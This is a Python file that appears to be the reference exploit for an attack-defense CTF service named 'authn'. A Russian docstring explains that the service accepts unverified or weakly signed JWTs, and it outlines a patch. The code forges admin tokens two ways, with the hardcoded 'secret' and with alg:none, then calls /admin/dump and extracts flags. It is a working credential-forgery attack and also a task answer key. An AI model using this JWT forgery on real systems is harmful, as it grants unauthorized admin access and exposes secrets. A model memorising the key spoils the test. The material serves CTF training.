"""ЭТАЛОН: authn — подделка JWT (JWT forgery).

Уязвимость (services/authn/app.py, helper current):
  токен авторизации — это JWT, но сервис декодирует его со слабым захардкоженным
  секретом "secret" И с options={"verify_signature": False} / algorithms=[...,"none"],
  т.е. подпись фактически не проверяется. Любой может выписать себе admin:True.
  GET /admin/dump (требует claims.admin == True) отдаёт ВСЕ секреты (флаги всех).

Эксплойт: подделываем admin-JWT (подпись слабым "secret" ИЛИ токен alg:none)
и дёргаем /admin/dump, оттуда вытаскиваем флаги.

Патч (services/authn/app.py): генерировать СИЛЬНЫЙ случайный секрет при старте
(secrets.token_hex(32)) и декодировать строго
jwt.decode(tok, SECRET, algorithms=["HS256"]) — без "none" и без
verify_signature=False. SLA (register -> login -> /stash) не страдает: токены
подписываются и проверяются одним и тем же секретом процесса.
"""
import base64
import json
import re

import jwt  # PyJWT
import requests

SERVICE = "authn"
FLAG = re.compile(r"[A-Z0-9]{31}=")


def _b64(obj) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _forge_tokens():
    payload = {"user": "attacker", "admin": True}
    # 1) подпись слабым секретом "secret" (HS256) — сервис его «проверяет».
    yield jwt.encode(payload, "secret", algorithm="HS256")
    # 2) токен с alg:none и пустой подписью — сервис принимает и это.
    yield _b64({"alg": "none", "typ": "JWT"}) + "." + _b64(payload) + "."


def exploit(host, port) -> list[str]:
    base = f"http://{host}:{port}"
    flags: list[str] = []
    for tok in _forge_tokens():
        try:
            r = requests.get(f"{base}/admin/dump", headers={"Authorization": tok}, timeout=5)
        except requests.RequestException:
            continue
        if r.status_code == 200:
            for s in r.json().get("secrets", []):
                flags += FLAG.findall(str(s))
            if flags:
                break
    return flags
